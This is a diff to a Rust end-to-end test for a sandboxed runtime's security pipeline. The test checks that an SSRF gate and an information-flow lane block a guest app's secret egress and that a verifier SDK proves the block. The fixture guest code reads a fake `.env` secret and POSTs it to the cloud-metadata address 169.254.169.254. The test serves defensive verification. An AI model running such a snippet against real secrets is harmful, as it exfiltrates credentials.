@@ -31,11 +31,15 @@
 //! following bead-vision layers are NOT yet reachable from a live `run` and
 //! are therefore NOT asserted here — each has a follow-up bead instead of a
 //! mock:
-//!   * Information-flow labels / declassification receipts on run
-//!     (`security::lineage_tracker` is library-only; FN-FLOW-* never emitted
-//!     on the run path). The exfil-attempt containment asserted below is the
-//!     REAL enforcement boundary that exists today: the SSRF egress gate
-//!     denies pre-socket and the denial is surfaced in the signed ledger.
+//!   * Information-flow labeling IS now wired on the run path (bd-plhag): a
+//!     read of a recognized secret file labels its bytes, an egress that
+//!     carries those bytes inherits the label, and a denied such egress is a
+//!     flow BLOCK the verifier SDK proves as "blocked_before_sink" (asserted
+//!     in the exfil variant below). Still open: byte-level PREVENTION of a
+//!     secret egress to an SSRF-ALLOWED endpoint (the ledger records+the SDK
+//!     detects it, but the runtime does not yet block it — a gate-level
+//!     follow-up), following a secret through in-guest transforms (needs
+//!     engine-side per-datum lineage), and operator declassification input.
 //!   * Bayesian sentinel escalation (`policy::runtime_sentinel` /
 //!     `policy::bayesian_diagnostics` are not fed observations by the
 //!     dispatcher; containment comes from the engine's expected-loss
@@ -797,23 +801,26 @@ fn tnr_full_pipeline_clean_run_single_trace_id() {
     );
 }
 
-/// The contained variant: the guest reads a (fixture) secret and attempts to
-/// exfiltrate it to the cloud-metadata endpoint. The SSRF egress gate denies
-/// BEFORE any socket opens; the denial is surfaced in the signed ledger (not
-/// masked by the exit code), and the full downstream pipeline — replay,
-/// counterfactual, offline SDK verification, LTV — runs over the denial
-/// evidence. (Information-flow labels/declassification are not yet wired
-/// into `run`; the SSRF gate is the real enforcement boundary today.)
+/// The contained variant: the guest reads a recognized secret file (`.env`)
+/// and attempts to exfiltrate its contents by POSTing them to the
+/// cloud-metadata endpoint. Two layered controls fire: the SSRF egress gate
+/// denies that endpoint BEFORE any socket opens, and the information-flow lane
+/// (bd-plhag) recognizes that the denied egress carries the secret's bytes and
+/// records it as a flow BLOCK. The denial is surfaced in the signed ledger
+/// (not masked by the exit code); the verifier SDK then proves OFFLINE that
+/// the forbidden label was blocked before the sink, and the full downstream
+/// pipeline — replay, counterfactual, LTV — runs over that evidence.
 #[test]
 fn tnr_full_pipeline_denied_exfil_variant_contained() {
     let app = "const fs = require('fs');\n\
-               const secret = fs.readFileSync('.env');\n\
+               const secret = fs.readFileSync('.env', 'utf8');\n\
                console.log('secret-bytes', secret.length);\n\
-               require('http').get('http://169.254.169.254/latest/meta-data/');\n";
+               const req = require('http').request('http://169.254.169.254/exfil', { method: 'POST' });\n\
+               req.end(secret);\n";
     let workspace = bootstrap_workspace(app, "legacy-risky");
     std::fs::write(
         workspace.path().join(".env"),
-        "TNR_FAKE_SECRET=not-a-real-secret-e2e-fixture\n",
+        "TNR_FAKE_SECRET=not-a-real-secret-e2e-fixture-abcdef0123456789\n",
     )
     .expect("write fixture secret");
 
@@ -854,6 +861,57 @@ fn tnr_full_pipeline_denied_exfil_variant_contained() {
     layer_pass(
         "L2 EFFECT exfil egress denied in signed ledger",
         &format!("denied_count={denied}"),
+    );
+
+    // ---- L2.5 FLOW (bd-plhag): the denied egress carries the secret's bytes,
+    // so it is recorded as a flow BLOCK, and the verifier SDK proves offline
+    // that the forbidden label was blocked before the sink.
+    let secret_commitment =
+        frankenengine_node::security::lineage_tracker::secret_file_label_set_commitment();
+    let egress = entries
+        .iter()
+        .find(|entry| entry["receipt"]["effect_kind"] == json!("http_request"))
+        .expect("http_request egress receipt");
+    assert_eq!(
+        egress["receipt"]["flow_policy_verdict"],
+        json!("blocked"),
+        "the denied secret egress must be a flow block: {egress}"
+    );
+    assert_eq!(
+        egress["receipt"]["label_set_commitment"],
+        json!(secret_commitment),
+        "the egress must carry the secret label commitment"
+    );
+    // FN-FLOW-003 (sink blocked) is emitted for the blocked egress under the
+    // pipeline trace id.
+    let flow_events = structured_events(&run.stderr);
+    assert_event_order(&flow_events, &["FN-FLOW-003"], EXFIL_TRACE_ID);
+    // Offline non-exfiltration proof over the run's own ledger entries.
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&serde_json::to_string(&ledger["entries"]).unwrap())
+            .expect("verifier SDK accepts the ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://tnr-full-pipeline-exfil");
+    let chain = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("effect chain re-derives offline");
+    let claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
+        forbidden_label_set_commitments: vec![secret_commitment],
+        external_sink_effect_kinds: vec!["http_request".to_string()],
+        allowed_declassification_refs: vec![],
+    };
+    let non_exfil =
+        frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(&chain, &claim)
+            .expect("non-exfiltration claim verifies: the secret was blocked before the sink");
+    assert!(
+        non_exfil
+            .examined_effects
+            .iter()
+            .any(|e| e.effect_kind == "http_request" && e.proof_outcome == "blocked_before_sink"),
+        "the SDK must classify the blocked secret egress as blocked_before_sink"
+    );
+    layer_pass(
+        "L2.5 FLOW secret egress blocked + non-exfiltration proven",
+        "flow_policy_verdict=blocked, SDK=blocked_before_sink",
     );
 
     // ---- L3 LOG: same ordered contract, exfil trace id; the denied
